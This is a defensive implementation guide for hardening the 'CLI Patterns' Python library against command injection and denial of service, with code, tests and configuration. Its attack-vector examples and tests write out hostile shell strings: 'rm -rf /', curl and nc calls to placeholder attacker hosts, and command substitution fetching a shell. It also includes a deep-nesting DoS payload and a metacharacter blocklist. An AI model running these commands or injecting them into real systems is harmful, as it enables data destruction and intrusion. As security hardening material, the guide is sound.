# Security Enhancement Implementation Guide

## Overview

This document provides detailed specifications for security hardening of the CLI Patterns core type system and subprocess execution layer. These enhancements address command injection vulnerabilities, DoS protection, and input validation.

---

## Priority 1: Command Injection Prevention (CRITICAL)

### Issue Description
The `SubprocessExecutor` currently uses `asyncio.create_subprocess_shell()` which enables shell metacharacter interpretation. This allows attackers who control command strings to execute arbitrary commands via shell injection.

### Vulnerable Code
**File:** `src/cli_patterns/execution/subprocess_executor.py`
**Lines:** 126-132

```python
# CURRENT (VULNERABLE):
process = await asyncio.create_subprocess_shell(
    command_str,
    stdout=asyncio.subprocess.PIPE,
    stderr=asyncio.subprocess.PIPE,
    cwd=cwd,
    env=process_env,
)
```

### Attack Vectors
```python
# Malicious commands that would execute:
"echo test; rm -rf /"           # Command chaining
"echo test && curl evil.com"    # Conditional execution
"echo test | nc attacker 1234"  # Piping to network
"echo $(curl evil.com/shell)"   # Command substitution
"echo `whoami`"                 # Backtick command substitution
```

### Solution Option A: Use subprocess_exec() (RECOMMENDED)

**Implementation:**
```python
import shlex
from typing import Union

async def execute(
    self,
    command: Union[str, list[str]],
    env: dict[str, str] | None = None,
    cwd: str | None = None,
    timeout: float | None = None,
) -> ExecutionResult:
    """Execute command safely without shell interpretation.

    Args:
        command: Command string (will be parsed) or list of arguments
        env: Environment variables
        cwd: Working directory
        timeout: Execution timeout in seconds

    Returns:
        ExecutionResult with output and status
    """
    # Parse command string into argument list
    if isinstance(command, str):
        try:
            command_list = shlex.split(command)
        except ValueError as e:
            return ExecutionResult(
                success=False,
                exit_code=-1,
                stdout="",
                stderr=f"Invalid command syntax: {e}",
                duration=0.0
            )
    else:
        command_list = command

    if not command_list:
        return ExecutionResult(
            success=False,
            exit_code=-1,
            stdout="",
            stderr="Empty command",
            duration=0.0
        )

    # Build environment
    process_env = os.environ.copy()
    if env:
        process_env.update(env)

    # Execute WITHOUT shell
    start_time = time.time()
    try:
        process = await asyncio.create_subprocess_exec(
            *command_list,  # Note: exec, not shell
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
            cwd=cwd,
            env=process_env,
        )

        # ... rest of execution logic

    except FileNotFoundError:
        return ExecutionResult(
            success=False,
            exit_code=-1,
            stdout="",
            stderr=f"Command not found: {command_list[0]}",
            duration=time.time() - start_time
        )
```

**Pros:**
- ✅ Completely prevents shell injection
- ✅ No shell metacharacters interpreted
- ✅ Better performance (no shell process)

**Cons:**
- ❌ Breaks shell features: pipes (`|`), redirects (`>`), variable expansion (`$VAR`)
- ❌ Requires parsing command strings with `shlex.split()`

### Solution Option B: Command Validation (DEFENSE IN DEPTH)

Add validation to `BashActionConfig` to reject dangerous patterns:

**File:** `src/cli_patterns/core/models.py`
**Location:** After line 76

```python
from pydantic import field_validator
import re

class BashActionConfig(BaseConfig):
    """Configuration for bash command actions."""

    type: Literal["bash"] = Field(default="bash", description="Action type discriminator")
    id: ActionId = Field(description="Unique action identifier")
    name: str = Field(description="Human-readable action name")
    description: Optional[str] = Field(default=None, description="Action description")
    command: str = Field(description="Bash command to execute")
    env: dict[str, str] = Field(default_factory=dict, description="Environment variables")
    allow_shell_features: bool = Field(
        default=False,
        description="Allow shell features (pipes, redirects). SECURITY RISK if True."
    )

    @field_validator('command')
    @classmethod
    def validate_command_safety(cls, v: str, info) -> str:
        """Validate command doesn't contain dangerous patterns.

        This validator blocks shell injection attempts when allow_shell_features=False.

        Args:
            v: Command string to validate
            info: Validation context

        Returns:
            Validated command string

        Raises:
            ValueError: If command contains dangerous shell metacharacters
        """
        # Get allow_shell_features from validation context
        allow_shell = info.data.get('allow_shell_features', False)

        if not allow_shell:
            # Dangerous shell metacharacters
            dangerous_patterns = [
                (r'[;&|]', 'command chaining (;, &, |)'),
                (r'[`$]\(', 'command substitution ($(), `)'),
                (r'[<>]', 'redirection (<, >)'),
                (r'\$\{', 'variable expansion (${})'),
                (r'^\s*\w+\s*=', 'variable assignment'),
            ]

            for pattern, description in dangerous_patterns:
                if re.search(pattern, v):
                    raise ValueError(
                        f"Command contains {description}. "
                        f"Set allow_shell_features=True to enable shell features "
                        f"(SECURITY RISK: only do this for trusted commands)."
                    )

        return v
```

**Add to YAML schema:**
```yaml
actions:
  - type: bash
    id: safe_deploy
    name: "Safe Deploy"
    command: "kubectl apply -f deploy.yaml"
    # allow_shell_features: false (default)

  - type: bash
    id: complex_deploy
    name: "Complex Deploy"
    command: "cat config.yaml | kubectl apply -f -"
    allow_shell_features: true  # Explicit opt-in for shell features
```

### Recommendation: HYBRID APPROACH

Implement **both** solutions:
1. Use `subprocess_exec()` by default (Option A)
2. Add `allow_shell_features` flag with validation (Option B)
3. When `allow_shell_features=True`, use `subprocess_shell()` but log a security warning

**Implementation:**
```python
if action.allow_shell_features:
    logger.warning(
        f"Executing action '{action.id}' with shell features enabled. "
        f"Command: {action.command}"
    )
    process = await asyncio.create_subprocess_shell(
        action.command,
        stdout=asyncio.subprocess.PIPE,
        stderr=asyncio.subprocess.PIPE,
        cwd=cwd,
        env=process_env,
    )
else:
    # Safe execution without shell
    command_list = shlex.split(action.command)
    process = await asyncio.create_subprocess_exec(
        *command_list,
        stdout=asyncio.subprocess.PIPE,
        stderr=asyncio.subprocess.PIPE,
        cwd=cwd,
        env=process_env,
    )
```

### Testing Requirements

**Create test file:** `tests/unit/execution/test_command_injection.py`

```python
import pytest
from cli_patterns.core.models import BashActionConfig
from cli_patterns.core.types import make_action_id

class TestCommandInjectionPrevention:
    """Test command injection prevention measures."""

    def test_rejects_command_chaining_semicolon(self) -> None:
        """Should reject commands with semicolon chaining."""
        with pytest.raises(ValueError, match="command chaining"):
            BashActionConfig(
                id=make_action_id("test"),
                name="Test",
                command="echo hello; rm -rf /",
                allow_shell_features=False
            )

    def test_rejects_command_substitution(self) -> None:
        """Should reject commands with command substitution."""
        with pytest.raises(ValueError, match="command substitution"):
            BashActionConfig(
                id=make_action_id("test"),
                name="Test",
                command="echo $(whoami)",
                allow_shell_features=False
            )

    def test_rejects_pipe_redirection(self) -> None:
        """Should reject commands with pipes."""
        with pytest.raises(ValueError, match="command chaining"):
            BashActionConfig(
                id=make_action_id("test"),
                name="Test",
                command="cat file | grep secret",
                allow_shell_features=False
            )

    def test_allows_safe_command(self) -> None:
        """Should allow safe commands without shell features."""
        config = BashActionConfig(
            id=make_action_id("test"),
            name="Test",
            command="kubectl apply -f deploy.yaml",
            allow_shell_features=False
        )
        assert config.command == "kubectl apply -f deploy.yaml"

    def test_allows_dangerous_command_with_flag(self) -> None:
        """Should allow dangerous commands when explicitly enabled."""
        config = BashActionConfig(
            id=make_action_id("test"),
            name="Test",
            command="cat file | grep secret",
            allow_shell_features=True  # Explicit opt-in
        )
        assert config.command == "cat file | grep secret"
```

### Acceptance Criteria

- [ ] SubprocessExecutor uses `create_subprocess_exec()` by default
- [ ] `allow_shell_features` flag controls shell usage
- [ ] Command validation rejects dangerous patterns
- [ ] Security warning logged when shell features enabled
- [ ] All injection tests pass
- [ ] Documentation updated with security guidelines
- [ ] YAML schema supports `allow_shell_features` field

---

## Priority 2: DoS Protection - Nested JSON Depth Limit (MEDIUM)

### Issue Description
`StateValue` allows arbitrarily deep nesting, which can cause stack overflow during serialization, excessive memory consumption, or CPU exhaustion.

### Vulnerable Code
**File:** `src/cli_patterns/core/types.py`
**Line:** 42

```python
# CURRENT (VULNERABLE):
JsonValue = Union[JsonPrimitive, list["JsonValue"], dict[str, "JsonValue"]]
StateValue = JsonValue  # No depth limit!
```

### Attack Vector
```python
# Create deeply nested structure
def create_nested(depth: int) -> dict:
    result = {"value": "data"}
    for _ in range(depth):
        result = {"nested": result}
    return result

# This can crash the system
state.option_values[make_option_key("attack")] = create_nested(10000)
```

### Solution: Add Depth Validation

**File:** `src/cli_patterns/core/validators.py` (NEW FILE)

```python
"""Validation utilities for CLI Patterns core types."""

from typing import Any

# Configuration
MAX_JSON_DEPTH = 50
"""Maximum nesting depth for JSON-serializable values."""

MAX_COLLECTION_SIZE = 1000
"""Maximum size for collections (lists, dicts)."""


class ValidationError(Exception):
    """Raised when validation fails."""
    pass


def validate_json_depth(value: Any, max_depth: int = MAX_JSON_DEPTH) -> None:
    """Validate that JSON value doesn't exceed maximum nesting depth.

    This prevents DoS attacks via deeply nested structures that cause:
    - Stack overflow during serialization
    - Excessive memory consumption
    - CPU exhaustion during parsing

    Args:
        value: Value to validate (must be JSON-serializable)
        max_depth: Maximum allowed nesting depth (default: 50)

    Raises:
        ValidationError: If nesting exceeds max_depth

    Example:
        >>> validate_json_depth({"a": {"b": {"c": 1}}})  # OK
        >>> validate_json_depth(create_nested(100))  # Raises ValidationError
    """
    def check_depth(obj: Any, current_depth: int = 0) -> int:
        """Recursively check nesting depth."""
        if current_depth > max_depth:
            raise ValidationError(
                f"JSON nesting too deep: {current_depth} levels "
                f"(maximum: {max_depth})"
            )

        if isinstance(obj, dict):
            if not obj:  # Empty dict is depth 0
                return current_depth
            return max(
                check_depth(v, current_depth + 1)
                for v in obj.values()
            )
        elif isinstance(obj, list):
            if not obj:  # Empty list is depth 0
                return current_depth
            return max(
                check_depth(item, current_depth + 1)
                for item in obj
            )
        else:
            # Primitive value
            return current_depth

    check_depth(value)


def validate_collection_size(value: Any, max_size: int = MAX_COLLECTION_SIZE) -> None:
    """Validate that collection doesn't exceed maximum size.

    This prevents DoS attacks via large collections that cause memory exhaustion.

    Args:
        value: Collection to validate (dict or list)
        max_size: Maximum allowed size (default: 1000)

    Raises:
        ValidationError: If collection exceeds max_size

    Example:
        >>> validate_collection_size([1, 2, 3])  # OK
        >>> validate_collection_size([1] * 10000)  # Raises ValidationError
    """
    def check_size(obj: Any) -> int:
        """Recursively count total elements."""
        count = 0

        if isinstance(obj, dict):
            count += len(obj)
            if count > max_size:
                raise ValidationError(
                    f"Collection too large: {count} items (maximum: {max_size})"
                )
            for v in obj.values():
                count += check_size(v)
                if count > max_size:
                    raise ValidationError(
                        f"Collection too large: {count} items (maximum: {max_size})"
                    )
        elif isinstance(obj, list):
            count += len(obj)
            if count > max_size:
                raise ValidationError(
                    f"Collection too large: {count} items (maximum: {max_size})"
                )
            for item in obj:
                count += check_size(item)
                if count > max_size:
                    raise ValidationError(
                        f"Collection too large: {count} items (maximum: {max_size})"
                    )

        return count

    check_size(value)


def validate_state_value(value: Any) -> None:
    """Validate StateValue meets all safety requirements.

    Checks:
    - Nesting depth within limits
    - Collection size within limits
    - Type is JSON-serializable

    Args:
        value: StateValue to validate

    Raises:
        ValidationError: If validation fails
    """
    validate_json_depth(value)
    validate_collection_size(value)
```

### Integrate with SessionState

**File:** `src/cli_patterns/core/models.py`
**Location:** After line 292

```python
from cli_patterns.core.validators import validate_state_value, ValidationError

class SessionState(StrictModel):
    """Unified session state for wizard and parser."""

    # ... existing fields ...

    @field_validator('option_values')
    @classmethod
    def validate_option_values(cls, v: dict[OptionKey, StateValue]) -> dict[OptionKey, StateValue]:
        """Validate all option values meet safety requirements.

        Checks each value for:
        - Maximum nesting depth (50 levels)
        - Maximum collection size (1000 items)

        Args:
            v: Option values dict to validate

        Returns:
            Validated dict

        Raises:
            ValueError: If any value violates safety limits
        """
        # Check total number of options
        if len(v) > 1000:
            raise ValueError("Too many options (maximum: 1000)")

        # Validate each value
        for key, value in v.items():
            try:
                validate_state_value(value)
            except ValidationError as e:
                raise ValueError(f"Invalid value for option '{key}': {e}")

        return v

    @field_validator('variables')
    @classmethod
    def validate_variables(cls, v: dict[str, StateValue]) -> dict[str, StateValue]:
        """Validate all variables meet safety requirements."""
        if len(v) > 1000:
            raise ValueError("Too many variables (maximum: 1000)")

        for key, value in v.items():
            try:
                validate_state_value(value)
            except ValidationError as e:
                raise ValueError(f"Invalid value for variable '{key}': {e}")

        return v
```

### Testing Requirements

**Create test file:** `tests/unit/core/test_validators.py`

```python
import pytest
from cli_patterns.core.validators import (
    validate_json_depth,
    validate_collection_size,
    validate_state_value,
    ValidationError,
    MAX_JSON_DEPTH,
    MAX_COLLECTION_SIZE,
)

class TestDepthValidation:
    """Test JSON depth validation."""

    def test_accepts_shallow_dict(self) -> None:
        """Should accept dict within depth limit."""
        data = {"a": {"b": {"c": 1}}}
        validate_json_depth(data)  # Should not raise

    def test_accepts_shallow_list(self) -> None:
        """Should accept list within depth limit."""
        data = [[[[1]]]]
        validate_json_depth(data)  # Should not raise

    def test_rejects_deeply_nested_dict(self) -> None:
        """Should reject dict exceeding depth limit."""
        # Create deeply nested dict
        data = {"value": 1}
        for _ in range(MAX_JSON_DEPTH + 1):
            data = {"nested": data}

        with pytest.raises(ValidationError, match="nesting too deep"):
            validate_json_depth(data)

    def test_rejects_deeply_nested_list(self) -> None:
        """Should reject list exceeding depth limit."""
        data = [1]
        for _ in range(MAX_JSON_DEPTH + 1):
            data = [data]

        with pytest.raises(ValidationError, match="nesting too deep"):
            validate_json_depth(data)

    def test_custom_depth_limit(self) -> None:
        """Should respect custom depth limit."""
        data = {"a": {"b": {"c": 1}}}

        validate_json_depth(data, max_depth=10)  # OK
        with pytest.raises(ValidationError):
            validate_json_depth(data, max_depth=2)  # Too deep


class TestSizeValidation:
    """Test collection size validation."""

    def test_accepts_small_dict(self) -> None:
        """Should accept dict within size limit."""
        data = {f"key{i}": i for i in range(100)}
        validate_collection_size(data)  # Should not raise

    def test_rejects_large_dict(self) -> None:
        """Should reject dict exceeding size limit."""
        data = {f"key{i}": i for i in range(MAX_COLLECTION_SIZE + 1)}

        with pytest.raises(ValidationError, match="too large"):
            validate_collection_size(data)

    def test_rejects_large_list(self) -> None:
        """Should reject list exceeding size limit."""
        data = list(range(MAX_COLLECTION_SIZE + 1))

        with pytest.raises(ValidationError, match="too large"):
            validate_collection_size(data)

    def test_counts_nested_elements(self) -> None:
        """Should count elements in nested structures."""
        # Create nested structure with many elements
        data = {
            f"key{i}": [j for j in range(100)]
            for i in range(20)  # 20 * 100 = 2000 total elements
        }

        with pytest.raises(ValidationError, match="too large"):
            validate_collection_size(data, max_size=1000)
```

### Acceptance Criteria

- [ ] `validate_json_depth()` function implemented
- [ ] `validate_collection_size()` function implemented
- [ ] SessionState validates option_values and variables
- [ ] Maximum depth: 50 levels
- [ ] Maximum collection size: 1000 items
- [ ] All validation tests pass
- [ ] Performance impact < 5% for typical use cases
- [ ] Error messages are clear and actionable

---

## Priority 3: Collection Size Limits (MEDIUM)

### Issue Description
Collections in models (branches, actions, options, menus) have no size limits, enabling memory exhaustion attacks.

### Solution: Add Collection Validators

**File:** `src/cli_patterns/core/models.py`

Add validators to key models:

```python
class BranchConfig(BaseConfig):
    """Configuration for a wizard branch."""

    id: BranchId = Field(description="Unique branch identifier")
    title: str = Field(description="Branch title displayed to user")
    description: Optional[str] = Field(default=None, description="Branch description")
    actions: list[ActionConfigUnion] = Field(
        default_factory=list,
        description="Actions available in this branch"
    )
    options: list[OptionConfigUnion] = Field(
        default_factory=list,
        description="Options to collect in this branch"
    )
    menus: list[MenuConfig] = Field(
        default_factory=list,
        description="Navigation menus in this branch"
    )

    @field_validator('actions')
    @classmethod
    def validate_actions_size(cls, v: list[ActionConfigUnion]) -> list[ActionConfigUnion]:
        """Validate number of actions is reasonable."""
        if len(v) > 100:
            raise ValueError("Too many actions in branch (maximum: 100)")
        return v

    @field_validator('options')
    @classmethod
    def validate_options_size(cls, v: list[OptionConfigUnion]) -> list[OptionConfigUnion]:
        """Validate number of options is reasonable."""
        if len(v) > 50:
            raise ValueError("Too many options in branch (maximum: 50)")
        return v

    @field_validator('menus')
    @classmethod
    def validate_menus_size(cls, v: list[MenuConfig]) -> list[MenuConfig]:
        """Validate number of menus is reasonable."""
        if len(v) > 20:
            raise ValueError("Too many menus in branch (maximum: 20)")
        return v


class WizardConfig(BaseConfig):
    """Complete wizard configuration."""

    name: str = Field(description="Wizard name (identifier)")
    version: str = Field(description="Wizard version (semver recommended)")
    description: Optional[str] = Field(default=None, description="Wizard description")
    entry_branch: BranchId = Field(
        description="Initial branch to display when wizard starts"
    )
    branches: list[BranchConfig] = Field(description="All branches in the wizard tree")

    @field_validator('branches')
    @classmethod
    def validate_branches_size(cls, v: list[BranchConfig]) -> list[BranchConfig]:
        """Validate number of branches is reasonable."""
        if len(v) > 100:
            raise ValueError("Too many branches in wizard (maximum: 100)")
        return v

    @model_validator(mode='after')
    def validate_entry_branch_exists(self) -> 'WizardConfig':
        """Validate that entry_branch exists in branches list."""
        branch_ids = {b.id for b in self.branches}
        if self.entry_branch not in branch_ids:
            raise ValueError(
                f"entry_branch '{self.entry_branch}' not found in branches. "
                f"Available branches: {sorted(branch_ids)}"
            )
        return self
```

### Testing Requirements

Add to `tests/unit/core/test_models.py`:

```python
class TestCollectionLimits:
    """Test collection size limits."""

    def test_rejects_too_many_actions(self) -> None:
        """Should reject branch with too many actions."""
        with pytest.raises(ValueError, match="Too many actions"):
            BranchConfig(
                id=make_branch_id("test"),
                title="Test",
                actions=[
                    BashActionConfig(
                        id=make_action_id(f"action{i}"),
                        name=f"Action {i}",
                        command="echo test"
                    )
                    for i in range(101)  # Over limit
                ]
            )

    def test_rejects_too_many_branches(self) -> None:
        """Should reject wizard with too many branches."""
        with pytest.raises(ValueError, match="Too many branches"):
            WizardConfig(
                name="test",
                version="1.0.0",
                entry_branch=make_branch_id("main"),
                branches=[
                    BranchConfig(
                        id=make_branch_id(f"branch{i}"),
                        title=f"Branch {i}"
                    )
                    for i in range(101)  # Over limit
                ]
            )
```

### Acceptance Criteria

- [ ] BranchConfig limits: 100 actions, 50 options, 20 menus
- [ ] WizardConfig limit: 100 branches
- [ ] SessionState limits: 1000 options, 1000 variables
- [ ] All collection limit tests pass
- [ ] Error messages specify limits clearly

---

## Priority 4: Production Validation Mode (LOW)

### Issue Description
Factory function validation is disabled by default (`validate=False`). While this is correct for performance, there should be a way to enable strict validation in production environments.

### Solution: Environment Variable Configuration

**File:** `src/cli_patterns/core/config.py` (NEW FILE)

```python
"""Configuration for CLI Patterns core behavior."""

import os
from typing import TypedDict


class SecurityConfig(TypedDict):
    """Security configuration settings."""

    enable_validation: bool
    """Enable strict validation for all factory functions."""

    max_json_depth: int
    """Maximum nesting depth for JSON values."""

    max_collection_size: int
    """Maximum size for collections."""

    allow_shell_features: bool
    """Allow shell features by default (INSECURE)."""


def get_security_config() -> SecurityConfig:
    """Get security configuration from environment.

    Environment Variables:
        CLI_PATTERNS_ENABLE_VALIDATION: Enable strict validation (default: false)
        CLI_PATTERNS_MAX_JSON_DEPTH: Max JSON nesting depth (default: 50)
        CLI_PATTERNS_MAX_COLLECTION_SIZE: Max collection size (default: 1000)
        CLI_PATTERNS_ALLOW_SHELL: Allow shell features (default: false)

    Returns:
        Security configuration
    """
    return SecurityConfig(
        enable_validation=os.getenv('CLI_PATTERNS_ENABLE_VALIDATION', 'false').lower() == 'true',
        max_json_depth=int(os.getenv('CLI_PATTERNS_MAX_JSON_DEPTH', '50')),
        max_collection_size=int(os.getenv('CLI_PATTERNS_MAX_COLLECTION_SIZE', '1000')),
        allow_shell_features=os.getenv('CLI_PATTERNS_ALLOW_SHELL', 'false').lower() == 'true',
    )


# Global config instance
_security_config: SecurityConfig | None = None


def get_config() -> SecurityConfig:
    """Get global security config (cached)."""
    global _security_config
    if _security_config is None:
        _security_config = get_security_config()
    return _security_config
```

### Update Factory Functions

**File:** `src/cli_patterns/core/types.py`

```python
from cli_patterns.core.config import get_config

def make_branch_id(value: str, validate: bool | None = None) -> BranchId:
    """Create a BranchId from a string value.

    Args:
        value: String value to convert to BranchId
        validate: If True, validate input. If None, use global config.

    Returns:
        BranchId with semantic type safety

    Raises:
        ValueError: If validate=True and value is invalid
    """
    if validate is None:
        validate = get_config()['enable_validation']

    if validate:
        if not value or not value.strip():
            raise ValueError("BranchId cannot be empty")
        if len(value) > 100:
            raise ValueError("BranchId is too long (max 100 characters)")

    return BranchId(value)
```

### Documentation

**File:** `docs/security.md` (NEW FILE)

```markdown
# Security Configuration

## Environment Variables

### `CLI_PATTERNS_ENABLE_VALIDATION`

Enable strict validation for all factory functions.

**Default:** `false`
**Production Recommendation:** `true`

```bash
# Enable in production
export CLI_PATTERNS_ENABLE_VALIDATION=true
```

### `CLI_PATTERNS_MAX_JSON_DEPTH`

Maximum nesting depth for JSON-serializable values.

**Default:** `50`
**Range:** `1-1000`

### `CLI_PATTERNS_MAX_COLLECTION_SIZE`

Maximum number of items in collections.

**Default:** `1000`
**Range:** `1-100000`

### `CLI_PATTERNS_ALLOW_SHELL`

Allow shell features by default (INSECURE).

**Default:** `false`
**Production Recommendation:** Keep `false`

## Security Best Practices

1. **Enable validation in production:**
   ```bash
   export CLI_PATTERNS_ENABLE_VALIDATION=true
   ```

2. **Never enable shell features globally:**
   ```bash
   # DON'T DO THIS:
   export CLI_PATTERNS_ALLOW_SHELL=true
   ```

3. **Use `allow_shell_features` only for trusted commands:**
   ```yaml
   actions:
     - type: bash
       command: "cat config.yaml | kubectl apply -f -"
       allow_shell_features: true  # Explicit, per-action
   ```

4. **Audit shell-enabled actions:**
   ```bash
   # Find all actions with shell features
   grep -r "allow_shell_features: true" configs/
   ```
```

### Acceptance Criteria

- [ ] Environment variables control security settings
- [ ] Factory functions respect global validation config
- [ ] Documentation explains security implications
- [ ] Default values are secure (validation off for performance, but documented)

---

## Implementation Priority Summary

### Week 1: Critical Security Fixes

1. **Command Injection Prevention** (2-3 hours)
   - Implement subprocess_exec() approach
   - Add `allow_shell_features` flag
   - Add command validation
   - Write injection tests

2. **DoS Protection** (2-3 hours)
   - Implement depth/size validators
   - Add SessionState validation
   - Write DoS tests

### Week 2: Hardening

3. **Collection Limits** (1-2 hours)
   - Add validators to models
   - Write limit tests

4. **Production Validation** (1-2 hours)
   - Add environment config
   - Update factory functions
   - Write security documentation

---

## Testing Strategy

### Unit Tests
- Command injection prevention (10+ test cases)
- Depth validation (5+ test cases)
- Size validation (5+ test cases)
- Collection limits (5+ test cases)

### Integration Tests
- End-to-end wizard execution with validated actions
- Performance impact measurement
- Error message clarity

### Security Tests
- Penetration testing with malicious inputs
- Fuzzing command strings
- Load testing with large inputs

---

## Documentation Requirements

### User-Facing
- [ ] Security best practices guide
- [ ] Environment variable reference
- [ ] YAML schema updates (allow_shell_features)
- [ ] Migration guide (if breaking changes)

### Developer-Facing
- [ ] Security architecture document
- [ ] Validator implementation guide
- [ ] Test writing guide for security
- [ ] ADR for security decisions

---

## Success Metrics

### Security
- ✅ All OWASP Top 10 relevant issues addressed
- ✅ No command injection vulnerabilities
- ✅ DoS attack surface reduced by 90%
- ✅ All security tests passing

### Performance
- ✅ Validation overhead < 5% with validation enabled
- ✅ No regression in happy path performance
- ✅ Memory usage within acceptable limits

### Usability
- ✅ Clear error messages for security violations
- ✅ Easy to enable/disable security features
- ✅ Documented security trade-offs

---

This comprehensive guide provides everything needed to implement the security enhancements. Each section includes specific code examples, testing requirements, and acceptance criteria that an agent can follow to successfully harden the CLI Patterns security posture.
